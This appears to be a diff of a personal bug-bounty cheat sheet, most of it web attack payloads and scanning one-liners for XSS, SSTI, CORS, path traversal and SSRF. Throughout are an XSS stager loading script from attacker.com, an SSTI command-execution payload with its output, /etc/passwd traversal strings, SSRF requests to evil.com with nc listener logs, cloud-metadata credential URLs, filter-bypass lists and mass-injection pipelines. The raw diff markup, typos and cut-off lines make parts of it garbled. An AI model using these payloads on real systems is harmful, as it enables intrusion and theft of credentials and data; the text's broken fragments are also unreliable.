-Pay careful attention to where your injection takes place. 
-For example, a clothing store may have a filter to show only shirts in the color blue. Added to the URL could be something along the lines of /?s=color_blue.
-
-Often times the first instinct is to inject by replacing everything after the =. Try replacing only the portion reflected on that page or the parameter you're looking to filter. Example /?s=color_<script>alert()</script>.
-
-Another injection point may be entering the payload after the filter like the example in these images. Example /?s=color_blue<script>alert()</script>
-
-
-   lesser known payload   /replace video with music, or image
-<video onerror="alert(1)">
-
-
-This payload puts a twist on requiring user interaction. By injecting a style tag, we manipulate the size of the HTML tag to be the size of the screen. Any mouse movement on the page will pop the alert.
-   1"%20onmouseover="alert(document.domain)"%20style="position%3Aabsolute;%20top%3A0;%
-
-
-
-        /?search=<IMG%20SRC=1%20onmouseover=alert()>             USING CASE SENSETIVE
-        
-        
-        
-        running 404 page example
-        
-        conduct a subdomain enumeration using tools such as Subfinder, Amass, and crt.sh.
-        performed a DNS brute force, resulting in the discovery of nearly 40,000 subdomains. 
-        running HTTPX on these subdomains, Ito identified  2,500 live and active ones.
-        check for active subdomain painstakly
-        
-         encountering the 403 Error,  decide to test whether if it is  a global restriction affecting all pages or specific to the main page by providing the subdomain with a dummy path.
-         example  = rplicense.redacted.com/dummy
-         
-         After inputting the dummy path, the 403 status code might  transformed into a 404 Not Found, indicating that the 403 code was exclusive to the main web page and not applicable to every        c    conceivable path. At this point, commenced fuzzing the web application using ffuf along with a wordlist named raft-large. 
-      Here’s the command:   
-      ffuf -u "rplicense.redacted.com/FUZZ" -w /path/to/word-list -H "User-Agent: Mozilla/5.0 (Galaxy S22; Android 6) AppleWebKit/537.48 (KHTML, like Gecko) Chrome/111.0.5628.105 Mobile Safari/537.48" -  rate 20  also fuzz achive/directory and check for forms and sumit payload where neccasry
- 
-
-   --></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src= https://tetstst.com></scrIpt>
-
-  WEAPONING XSS
-  
-NOTE: WHEN having a simple XSS in alert form But when we attempted to demonstrate its impact or leverage it beyond an alert we have nothing! Thankfully, if you find yourself in this situation, you can write a compact XSS stager with 98 characters using the following JavaScript syntax (note, you could save a few more characters by registering a shorter domain name and using an index page):   
-  <svg/onload=body.appendChild(document.createElement`script`).src='https://attacker.com/p' hidden/>
-  
- NOTE:  when injecting an  XSS payload let say we excute the alert(1)” payload, and the page got empty we notice something is wrong in the background. Some of the page is missing... So why can’t we access it? The problem is with our injection point; where it is in the page. If you're injecting code before an element you need to access, you first need to wait for the DOM to finish being built before your code executes. This is because the page is built "top-to-bottom" and in this case our payload is injected into the “To” field which comes before the "csrf" token field. As such the “csrf” element does not yet exist at the time of execution as the DOM hasn’t finished being built! This is why some elements are missing when we execute an alert.
-  
-To compensate for this, you can attach an event listener to the document which will trigger your code once the DOM has completed its loading process. As ever, there are multiple ways to do this but the “by design” event for handling this is called “DOMContentLoaded”, and can be used as follows:
-
-  ?name="><script>document.addEventListener("DOMContentLoaded",()=>alert(csrf.value))</script><link/rel="
-  
-  when CSP is not your friend   "lol". We can no longer execute inline JS, so we cannot directly inject a reflected XSS payload. Furthermore, we now also can’t load JS resources outside of the application’s own origin ..  To bypass the CSP policy and get back to our ever-reliable alert box we can use this 2nd injection URL as the source for the first XSS injection script - think XSS-inception (Remember to use double URL encoding):
-   
-   ?name=Bob<script src='https://demoapp.loc/js/script?v=1.7.3.css%2522/>%2527)%3Balert(%2522Yeah!%2520Chaining!%2522)%3B//'></script>
-  
- NOTE:    allow try to copying CSRF token from a different browser session and see if you can reuse it // this could to lead to chainging xss with csrf AND CSRF BYPASS
- 
- 
- 
- Payload - <svg+viewBox="0+0+50+50"+xmlns="http://w3.org/2000/svg">+++++<rect+width="10"+height="10">+++++++++<animate+onbegin=alert(1)+attributeName="rx"+values="0;5;0"+dur="10s"+/>+++++</rect>
- 
- 
- xss oneliner   //   
-        How to Hunt Blind XSS using Dalfox //
-  waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b blindxss.xss.ht pipe > output.txt
-  
-   How to Hunt Reflected XSS
-  waybackurls testphp.vulnweb.com| grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
-    
-    Find the parameters which are not filtering special characters - One Liner
-     echo "test.url" | waybackurls | grep "=" | tee waybackurls.txt
-cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|pdf|svg|txt)" | qsreplace '"><()'| tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "\"><()" && echo -e "$host \033[91m Vullnerable \e[0m \n" || echo -e "$host  \033[92m Not Vulnerable \e[0m \n"; done | tee XSS.txt
-
-
-
-
-     USING XSS-VIBES    check docs
-     first test for dangerous charaters .. this involves =batman" in url links and check if it is reflected in , if reflected, apply some apyload 
-     on xss-vibes directory
-     katana -u "url" -o katana.txt
-      python3 main.py -f katana.txt -o xss_vibes.txt
-       python3 main.py -f katana.txt -o --waf                  // to dectect if there is web application firwall
-      python3 main.py -f katana.txt -w cloudflare -t 5        //specify the firewall
+https://github.com/BlackFan/client-side-prototype-pollution 
      
      
      
-     adding payload on xss-vibes
-     $ python3 added.py -p "payload"
-      $ python3 added.py -p "payload"  -w cloudflare
-      $ python3 added.py -f payload.txt -w  wordfence                adding a payload with filename and also speciflying the name 
      
-     USING MY NUCLEI TEMPLET FOR XSS 
-     nuclei -l url.txt -t xss.yml                   this is on my desktop/tool
+     SSTI       SSTI                              SSTI                              SSTI                     SSTI   
+     
+   Once you detect that there's SSTI, using an invalid input and getting a result, it's important to try to determine which template engine is used. Why? Because despite all of them working in similar ways, they have important differences that we need to keep in mind while exploiting the bug.
+
+Payload 
+
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter( "id")}} The output will be something like that:
+uid=1000(k) gid=1000(k) groups=1000(k),10(wheel)
+
+
+https:/​/​hackerone.​com/​reports/​125980.
      
      
-     https://brutelogic.com.br/poc.svg // this is url for xss
+     
+     
+     
+     
+     
+     
+     
+     
+     
+     
+     
+     
+     
+     
+     
+     
+     
+     
+     
+     
      
      
      
      CSRF      CSRF              CSRF       CSRF     CSRF
+     
+      tools
+      https://t.co/xHXD1aUIv2
+      https://t.co/vVpOhnQLF9
+      https://t.co/eSAkNhqcC6
+     
      https://medium.com/@drthkol478/csrf-bug-hunting-methodology-intermediate-4d0df3b63b59
      
      note:  any place on the app that manipulates user data is a potential CSRF vector.
@@ -3230,9 +2377,30 @@ Try deleting the header entirely
 
 Always try modifying or deleting anti-csrf values.
 Look for additional vectors like CRLF injection when non session tied cookies are implemented as a security measure.
+
 Even if something looks secure, dig dip, try every angle and only then move on :)
+
+
+             EXPLOITING CLIENT-SIDE PATH TRAVERSAL TO PERFORM CROSS-SITE REQUEST FORGERY
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
    
-  CORS  BYPASSING / MISCONFIGURED
+  CORS  BYPASSING / MISCONFIGURED                                    CORS  BYPASSING / MISCONFIGURED                                   CORS  BYPASSING / MISCONFIGURED
   ffuf
   ffuf -w subdomains-top1million-5000.txt -u http://10.20.30.40 -H 'Origin: http://FUZZ.target.com' -mr "Access-Control-Allow-Origin" -ignore-body
 
@@ -3282,7 +2450,7 @@ Even if something looks secure, dig dip, try every angle and only then move on :
   
   
   TIP
-  ALWYS CHECK IF THE WEBSITES ALWSY TRUST ANT SUBDOMAIN THROW AT IT, IF YES , FIND THE XSS ON THE SUBDOMAIN  or any subdomain it trustes    //CHECK FOR GUIDANCE AT https://danielantonsen.com/abusing-cors-improper-origin-validation/
+  ALWYS CHECK IF THE WEBSITES ALWSY TRUST ANY SUBDOMAIN THROW AT IT, IF YES , FIND THE XSS ON THE SUBDOMAIN  or any subdomain it trustes    //CHECK FOR GUIDANCE AT https://danielantonsen.com/abusing-cors-improper-origin-validation/
   
   examples
   function cors() {  
@@ -3459,7 +2627,13 @@ Origin:attacker.com/target.com
 
 
   
-    LOCAL/REMOTE FILE INCLUSION (LFI/RFI)      LOCAL/REMOTE FILE INCLUSION (LFI/RFI)                LOCAL/REMOTE FILE INCLUSION (LFI/RFI)
+    LOCAL/REMOTE FILE INCLUSION (LFI/RFI)/PATH TRAVERSY      LOCAL/REMOTE FILE INCLUSION (LFI/RFI) // PATH TRAVERSY               LOCAL/REMOTE FILE INCLUSION (LFI/RFI) //   PATH TRAVERSY
+    
+    tip
+    One Liner to Find NGINX Path Traversal by
+    httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' 
+    
+    cat allurls.txt | gf lfi | nuclei --tags lfi                                                      coffins
     http://example.com/index.php?log_file=/var/log/apache2/access.log&cmd=id
     
     You can test for this issues in two ways:
@@ -3470,7 +2644,9 @@ If you use the second option you will miss a lot of bugs because you depends of 
 
 An alternative approach is to combine both methods. You can check for parameter reflection in XHR Requests and then understand how the javascript is handling that parameter.
 
-
+  tip
+  Here's a little tip to escalate Client Side Path Traversal (in <script src>) to XSS in wordpress sites;
+ It is possible to use the /wp-json/?_jsonp=<payload> rest-api path to execute arbitrary js functions.
 
 
 
@@ -3494,6 +2670,8 @@ An alternative approach is to combine both methods. You can check for parameter 
   Open any picture in another window for example: "https://peering.google.com/static/images/couch-ipad.png".
 Add one of this value at the end of the link: ("../../../../../../../etc/passwd") OR ("../../../../../../../proc/self/cmdline") OR ("../../../../../../../proc/self/stat") OR ("../../../../../../../proc/self/status").
 
+
+  tip
    ///////
    found interesting param using gf tool --> send request to Intruder --> using LFI-Jhaddix wordlist -->Got LFI 
 Payload used: %2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
@@ -3580,24 +2758,12 @@ http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/pas
 ?conf={payload}
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
     SSRF         SSRF        SSRF      SSRF      SSRF
         tools
+        check this twitter post
+        https://x.com/Rhynorater/status/1689400476452679682
+        
+        
     # https://github.com/tarunkant/Gopherus
 gopherus --exploit [PLATFORM]
 # https://github.com/daeken/SSRFTest
@@ -3606,6 +2772,13 @@ gopherus --exploit [PLATFORM]
 # https://github.com/cujanovic/SSRF-Testing
 # https://github.com/bcoles/ssrf_proxy
 https://github.com/blackhatethicalhacking/SSRFPwned
+
+
+   check
+   https://github.com/xawdxawdx/sentrySSRF                        //Tool to searching sentry config on page or in javascript files and check blind SSRF
+   
+   https://github.com/KathanP19/gaussrf
+   https://github.com/ksharinarayanan/SSRFire
 
 allows check this x-mind while testing for   ssrf      https://xmind.app/m/eJm7bd/#
 
@@ -3637,10 +2810,1828 @@ http://example.com/ssrf.php?url=file:///C:/Windows/win.ini
       dict
      http://example.com/ssrf.php?dict://evil.com:1337/
     evil.com:$ nc -lvp 1337
+    Connection from [192.
+     
+     sftp
+    http://example.com/ssrf.php?url=sftp://evil.com:1337/
+   evil.com:$ nc -lvp 1337
+   Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 37146)
+   SSH-2.0-libssh2_1.4.2
+
+       ldap
+       http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit
+       http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit
+         http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit
+         
+         
+         tftp
+         http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET
+     evil.com:# nc -lvup 1337
+   Listening on [0.0.0.0] (family 0, port 1337)
+   TESTUDPPACKEToctettsize0blksize512timeout3
+   
+      
+      gopher
+      http://example.com/ssrf.php?url=http://attacker.com/gopher.php
+gopher.php (host it on acttacker.com):-
+<?php
+   header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');
+?>
+
+evil.com:# nc -lvp 1337
+Listening on [0.0.0.0] (family 0, port 1337)
+Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 49398)
+Hi
+Testing for SSRF
+
+     
+  
+   // DNS Interaction Payloads:
+Utilize payloads to interact with DNS services and gather information.
+http://attacker-controlled-domain.com
+http://attacker-controlled-domain.com:80
+http://attacker-controlled-domain.com:443
+
+  // HTTP Protocol Abuse:
+Test SSRF by manipulating the protocol and attempting to access internal services.
+ftp://attacker-controlled-domain.com:21/
+
+   // IPv6 Based Payloads:
+Test SSRF vulnerabilities with IPv6 addresses.
+http://[::]:80
+http://[::1]:80
+http://0:0:0:0:0:ffff:7f00:1
+
+// SSRF via Parameter Manipulation:
+Manipulate parameters to test SSRF in URL parsing.
+http://target.com/?url=http://attacker-controlled-domain.com
+http://target.com/?path=http://attacker-controlled-domain.com
+
+  // SSRF via Request Smuggling:
+Explore SSRF vulnerabilities through HTTP request smuggling.
+POST /path HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+Host: attacker-controlled-domain.com
 
 
+//Testing Local Services:
+Test SSRF by targeting common internal services.
+http://127.0.0.1:22
+http://localhost:3306
+http://internal-service.local:8080
+
+
+
+🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨🚨Bit tip for SSRF. Remaining automate yourself 
+
+subfinder -d http://example.com | httpx -mc 200 | tee ssrf-test.txt 
+cat ssrf-test.txt | httpx -mc 200 | gf open-redirect | qsreplace "server-url"
+
+
+  
+
+
+     Where to Start?
+Look at the PDF and take note of any data in it that you provided to the application such as name, address, digital signature, etc. These are good parameters to investigate. During your investigation, there are a few questions you’ll want to answer:
+
+Can I inject HTML?
+Can I access remote servers?
+Can I execute JavaScript?
+Is the server that’s rendering my PDF cloud hosted?
+Are there any known vulnerabilities in the component that’s generating the PDF?
+What other services or systems can I interact with?
+
+
+                     
+  
+                
+
+
+       map the application
+        identify any request parameter that contains hostnames, ip addresses or full url
+                 
+    for each request parameter, modify its value to specify an alternative resources and observes how the application responds 
+        if a defence is in place, attempt to circumn=vent or bypass it using know techniques
+     
+    for each request parameter, modify its value to a server on the internet that you control and monitor the server for incomming request
+    
+    
+    regular/ In band SSrf
+    if the application does not allow for arbitary user-supplied Urls, try to bypass defenses using the following techniques
+         use different encoding schemes
+            decimal-encoded version of 127.0.0  i.e  2130706433
+            127.1 resolves to 127.0.0.1
+            octal rep of 127.0.0.1  i.e  01700000001
+     
+     register a domain name that rsolves to internal ip address (dns rebinding )
+     use your own server that rediriect to an internal ip addresses (http redirection)
+     
+     
+     BLIND SSRF / OUT OF BAND SSRF          BLIND SSRF / OUT OF BAND SSRF        BLIND SSRF / OUT OF BAND SSRF
+     attemps to trigger an http request to an external system that you control and monitor the system for network interaction from the vulnerabble server 
+       using burp collaborator
+       
+       
+       //use ngrok for your server request ..    ngrok http 80  and copy the port forward and paste to browsers
+       allows excalate to lfi
+       google dorks for ssrf
+       site:https://somaiya.edu.in ext:php inurl:download.php
+        https://example.com/viewimage/?url=file:///etc/passwd  ///
+        https://example.com/viewimage/?url=http://169.254.169.254/latest/meta-data     // this is redirtling the file to aws/metadata
+        
+        
+        
+       One way of finding them is by inserting your burp collaborator domain into the referrer header also known as host header injection.
+    Snippet: 
+    
+            GET /HTTP 1.1
+    Host: site.tld
+    User Agent: Firefox
+    Referrer: https://your_collaborator_instance.com
+        
+        
+        HOW TO CATCH A BLIND SSRF
+   1)    In order to validate that you can interact with internal services or applications, you can utilise “SSRF canaries”. If you receive a request to your canary host, it means that you have successfully hit an internal service that is also capable making outbound requests.
+   
+   
+   Steps to Detect Blind SSRF using OOB:
+1. Set up a listener: Use tools like http://webhook.site, Burp Collaborator or your own server to listen for incoming requests. This server is your OOB channel, awaiting incoming requests from the target server.
+
+2. Craft a payload: For potential SSRF, inject a payload pointing to your OOB listener. For instance, if you suspect an image upload functionality to be vulnerable, you might provide a URL that points to your server.
+
+3. Monitor your listener: If the server is vulnerable and processes your payload, it’ll send a request to your OOB listener. This request is your confirmation that the Blind SSRF exists.
+
+4. Further exploitation: Depending on the nature of the vulnerability and the functionality of the application, you may be able to demonstrate the impact of this vulnerability.
+       
+       
+       
+       TIP 1
+       
+       If you found an SSRF vulnerability that runs on EC2, try requesting http://169.254.169.254/latest/meta-data/. This will return a lot of useful information for you to understand the infrastructure and may reveal Amazon S3 access tokens, API tokens, and more. You may also want to download http://169.254.169.254/latest/user-data/ and unzip the data.
+       TIP 2
+       //File uploads: instead of uploading a file, try sending a URL and see if it downloads the content of the URL. Here’s an example.//
+       automaton with SSRF MAP
+        python3 ssrfmap.py -r ssrf.txt -m readfiles -p "pdf_path"       check docs on ssrfmap         ssrf.txt is a request to burp
+
+
+   TIP   
+   
+- Just extract endpoints from waymore
+- See endpoint called Imageurl=
+- Test Burp collab url (You can see response in burp because it's Image content type)
+- Then advance exploit
+- Found 5 Hosts vulnerable with same endpoint
+      
+      
+      
+         ?url=http://safesite.com&site.com
+  ?url=http://////////////site.com/
+?url=http://site@com/account/edit.aspx
+?url=http://site.com/account/edit.aspx
+?url=http://safesite.com?.site.com
+?url=http://safesite.com#.site.com
+?url=http://safesite.com\.site.com/domain
+?url=https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
+?url=https://192.10.10.3/
+?url=https://192.10.10.2?.192.10.10.3/
+?url=https://192.10.10.2#.192.10.10.3/
+?url=https://192.10.10.2\.192.10.10.3/
+?url=http://127.0.0.1/status/
+?url=http://localhost:8000/status/
+?url=http://site.com/domain.php
+<?php
+header(‘Location: http://127.0.0.1:8080/status');
+?>
+             
+
+                http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
+   http://%73%68%6d%69%6c%6f%6e%2e%63%6f%6d
+http://////////////site.com/
+http://0000::1:80/
+http://000330.0000072.0000326.00000343
+http://000NaN.000NaN
+http://0177.00.00.01
+http://017700000001
+http://0330.072.0326.0343
+http://033016553343
+http://0NaN
+http://0NaN.0NaN
+http://0x0NaN0NaN
+http://0x7f000001/
+http://0xd8.0x3a.0xd6.0xe3
+http://0xd8.0x3a.0xd6e3
+http://0xd8.0x3ad6e3
+http://0xd83ad6e3
+http://0xNaN.0xaN0NaN
+http://0xNaN.0xNa0x0NaN
+http://0xNaN.0xNaN
+http://127.0.0.1/status/
+http://127.1/
+http://2130706433/
+http://216.0x3a.00000000326.0xe3
+http://3627734755
+http://[::]:80/
+http://localhost:8000/status/
+http://NaN
+http://safesite.com#.site.com
+http://safesite.com&site.com
+http://safesite.com?.site.com
+http://safesite.com\.site.com/domain
+http://shmilon.0xNaN.undefined.undefined
+http://site.com/account/edit.aspx
+http://site.com/domain.php
+http://site@com/account/edit.aspx
+http://whitelisted@127.0.0.1
+https://192.10.10.2#.192.10.10.3/
+https://192.10.10.2?.192.10.10.3/
+https://192.10.10.2\.192.10.10.3/
+https://192.10.10.3/
+
+Abusing Enclosed Alphanumerics
+http://169。254。169。254/
+
+http://169｡254｡169｡254/
+
+http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
+
+http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
+
+http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/
+
+http://②⑧⑤②⓪③⑨①⑥⑥:80/
+
+http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/
+
+http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥:80/
+
+http://⓪⓪②⑤①｡⓪⓪⓪③⑦⑥｡⓪⓪⓪⓪②⑤①｡⓪⓪⓪⓪⓪③⑦⑥:80/
+
+http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]:80/
+
+http://[::ⓕⓕⓕⓕ:①⑥⑨。②⑤④。⑯⑨。②⑤④]:80/
+
+http://⓪ⓧⓐ⑨。⓪③⑦⑥。④③⑤①⑧:80/
+
+http://⓪ⓧⓐ⑨｡⑯⑥⑧⑨⑥⑥②:80/
+
+http://⓪⓪②⑤①。⑯⑥⑧⑨⑥⑥②:80/
+
+http://⓪⓪②⑤①｡⓪ⓧⓕⓔ｡④③⑤①⑧:80/
+
+You can embed credentials in a URL before the hostname:
+https://expected-host:fakepassword@evil-host
+https://evil-host#expected-host                 using the #character  and also check if  You can also try double-encoding characters and try the combination of all this techiniques
+
+
+
+
+
+https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
+<?php
+header('Location: http://127.0.0.1:8080/status');
+?>
+
+    # Localhost bypasses
+0
+127.00.1
+127.0.01
+0.00.0
+0.0.00
+127.1.0.1
+127.10.1
+127.1.01
+0177.1
+0177.0001.0001
+0x0.0x0.0x0.0x0
+0000.0000.0000.0000
+0x7f.0x0.0x0.0x1
+0177.0000.0000.0001
+0177.0001.0000..0001
+0x7f.0x1.0x0.0x1
+0x7f.0x1.0x1
+
+
+    http://[::]:80/
+http://[::]:25/ SMTP
+http://[::]:22/ SSH
+http://[::]:3128/ Squid
+http://[0000::1]:80/
+http://[0000::1]:25/ SMTP
+http://[0000::1]:22/ SSH
+http://[0000::1]:3128/ Squid
+
+http://[0:0:0:0:0:ffff:127.0.0.1]
+http://[::ffff:127.0.0.1]
+
+
+  http://169.254.169.254/latest/meta-data/iam/security-credentials
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+
+# Examples
+http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+
+
+
+# Blind SSRF
+- Review Forms
+- Contact Us
+- Password fields
+- Contact or profile info (Names, Addresses)
+- User Agent
+
+# SSRF through video upload
+# https://hackerone.com/reports/1062888
+# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS
+
+
+   
+  /// sometimes it is possible to use other schemes and protocols in a SSRF attack other than HTTP. Examples of these are file://, phar://, gopher://, data://and dict://
+   
+
+
+
+   NOTE **** Google Cloud metadata requests require specific headers to be included
+   curl "http://metadata.google.internal/computeMetadata/v1/instance/image" -H "Metadata-Flavor: Google"
+ 
+      TIPS 1 on ssrf
+  1      gau -subs example.com; subfinder -d example.com -silent |waybackurls | gf ssrf | sort -u >> testblindssrf.txt
+     then create a burpcollaburaor payload server and use qsreplace to replace all parameter value with burpcollaborator server payload and fuzz it with ffuf
+  2  cat testblindssrf.txt | qsreplace “http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net" >> ssrfuzz.txt   
+     and then ffuf
+  3  ffuf -c -w ssrfuzz.txt -u FUZZ -t 200 >
+  
+  
+  Now  check whether if we get any http request hit on our burp collaborator server
+  
+  if yes , escalate to Rce with burp collabator
+    example https://url?burpcollabuarator?`payload`
+  
+  http:/devtest.exampl.com/import/picture?next_image=http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net?`whoami` and check the link on your browers
+  
+    filter
+  cat sort.txt | grep ? | tee grep.txt  /// filltered out parameters
+  cat parameter.txt | grep -E *[.]js     filter out javascript
+  
+               SSRF ONELINER
+  findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://YOUR.burpcollaborator.net
+  cat subdomains.txt | dnsx | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://hacker.burpcollaborator.ne
+  
+       CHECK BLIND SSRF IN HEADER,PATH,HOST & CHECK XSS VIA WEB CACHE POISONING.
+   cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotort'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotort'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotort'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotort HTTP/1.1 ""\n";done\
+  
+  
+  TIP 2 on ssrf 
+  do some subdomain findings
+  check weyback machine for endpoint on subdomian
+  
+  find a parameter that takes URL as the value then  directly look for the SSRF vulnerability.
+  search for add./endpoint
+  try new endpoint and check for http response 
+  check cors
+   give to Burp Collaborator/ ngrok  instance to see if it would fetch my instance:
+  bruteforce new endpoint and check for paths and directories  
+  
+  tip
+  SSRF are ❤️
+  
+
+file:///etc/passwd : Not authorized
+file://\/\/etc/passwd : Work
+
+
+      Ssrf using Surf
+surf --hosts subdomain-data.txt
+
+
+
+
+
+  tip
+  Using waymore for blind ssrf
+
+python3 waymore.py -i input.txt -mode U -oU waymore.txt -r 3
+
+
+cat waymore.txt | grep -viE '\.png|\.jpg|\.jpeg|\.css|\.js|\.svg|\.gif' | grep -iE 'feedback|support' | qsreplace FUZZ | sort -u | httpx -t 300 | anew waymore-filtered.txt
+
+
+cat waymore.txt | grep -viE '\.png|\.jpg|\.jpeg|\.css|\.js|\.svg|\.gif' | grep -iE 'login|register|auth|sign|account' | qsreplace FUZZ | sort -u | httpx -t 300 | anew waymore-filtered.txt
+  
+  
+  tip3 
+   
+     dig (url)
+     ip ../etc/password
+     199.1.3.134/../etc/passwd      you can check for other payload 
+     search for whois information
+     proceeded to make the API call to read AWS instance metadata (http://169.254.169.254/latest/meta-data/ 
+     check for url caching works if there, try to understand how url caching works    ////  
+     
+     https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://127.0.0.1:4848/theme/META-INF%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2fetc%2fpasswd
+  
+   TIP//
+   1 — Get the alive subdomain from subfinder and send them to httpx
+
+2 — Open the burp suite, create a new project and set up your autorepeater with the beloe regex and settings like the above image.
+    regex for ssrf in autorepeter =  https?://(www.)?[-a-zA-Z0–9@:%.+~#=]{1,256}.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%+.~#?&//=]*)
+
+
+3 — Use Katana tool by projectdiscvery and use the proxy option and add the burp proxy URL by the default, it will be http://127.0.0.1:8080
+
+4 — Open the subdomain manually by the browser and visit every login page and any page you have seen on the target website you have.
+
+5 — Open the burp again and you will see the catch by the burp suite auto repeater extension, if there are any parameters to take an input like http://google.com it will change to your collab URL you have been replaced with in the autorepeater and if that no response send to your collab you will see that the autorepeater have saved the tested URL in it until you close the burp suite.
+
+ oneliner for the above
+ subfinder -d hackerone.com | httpx -timeout 10 | katana -proxy http://127.0.0.1:8080 -jc -aff 
+ 
+ 
+  find a pdf endpoint   *****   ****
+   https://www.example.com/employeeRecord/?record=XYZ.pdf
+    capture this request and modify the value of the “record” parameter with Burp Collaborator.URL like this:https://www.example.com/employeeRecord/?record=http://burpcolaboratorlink.com 
+    https://www.example.com/employeeRecord/?record=http://burpcolaboratorlink.com | echo hello               command injection
+    
+   **** ****  sometimes,  removed the whole path value and replaced the value with you  burp collaborator URL , check the response on burp collaborator listener, if there is response,explored some of the bypass techniques  on the path value..   check for ssrf waf bypass technique
+     
+ 
+  
+   
+   
+   http://canarytokens.com/traffic/wzjxrkmmgjd8em4swawz08eey/post.jsp /////
+   
+   <img src="file :///C:\Program Files\Internet Explorer\images\bing.ico">
+   
+   
+  TIP6 
+  some  application contains an open redirection vulnerability in which the following URL
+  /product/nextProduct?currentProductId=6&path=http://evil-user.net
+  You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows: 
+  stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
+   
+   
+   
+   
+   
+   These are the top 5 obvious features I look for in a target app to find SSRF Issues:
+
+1️⃣ Export to PDF - Does your target app support generating PDFs? 📄 Try injecting HTML into the content that is used for generating that PDF. If vulnerable to HTML injection, you might strike gold by injecting HTML/JS.💰
+
+2️⃣ Integrations - If your target app supports web hook Integration feature, replace the URL with your Burp Collab and wait for a hit. 🔄
+
+3️⃣ Import via link Feature - Does your target app support importing files or websites via a link? 📥 Specify your attacker Burp Collab and check for a hit, especially when uploading profile pictures or media through a library.
+
+4️⃣ Host Header - Test for Routing-based SSRF by supplying your Collaborator server domain in the Host header. If you receive a DNS lookup from the target server, you might be able to route requests to arbitrary domains🌐
+
+5️⃣ File Upload - Does your target app support uploading files? 📂 Try uploading an HTML file; if rendered and executed on the server-side, you might strike gold. No luck? Try an SVG with SSRF payload. If that fails, move on to the next!
+   
+   SSRF Tip
+   look for subdomian by Amass, Sublist3r and subdomainer
+   check live subdomain
+   cat all-domains.txt | httpx > all-live.txt
+    find all the urls associated with the domains
+    cat all-live.txt | gauplus -subs -b png,jpg,gif,jpeg,swf,woff,gif,svg -o allUrls.txt
+    Injection Burp Collaborator URL in Parameters
+    cat allUrls.txt | grep "=" | qsreplace http://troupga5ke78yjdu4hv12s1v2m8dw3ks.oastify.com > ssrf.txt
+    Test for SSRF Vulnerabilities
+   cat ssrf.txt | httpx -fr
+   If any url vulnerable to SSRF will be show in burp collaborator.
+   
+   
+   //////
+    never forgot to look into JavaScript files, as it is possible to get new endpoints from them.
+   
+   
